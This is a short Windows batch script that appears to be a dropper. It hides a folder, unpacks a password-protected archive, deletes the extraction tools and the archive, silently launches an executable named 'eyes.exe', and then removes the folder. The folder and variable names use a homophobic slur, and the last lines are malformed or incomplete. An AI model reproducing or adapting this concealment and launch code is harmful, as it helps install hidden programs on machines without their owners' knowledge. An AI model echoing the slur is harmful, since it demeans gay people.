@echo off

rem START /min /D C:\fagballs C:\fagballs\ext.bat

set fag=C:\fagballs
set app=eyes.exe

cd %fag%
attrib +H %fag%

7z.exe e poop.7z -p123

del /f /q "%fag%\7z.exe"
del /f /q "%fag%\7z.dll"
del/ f /q "%fag%\poop.7z"

START /min /D %fag% %fag%\%app%

rd /s /q "%fag%"
del /f /q 

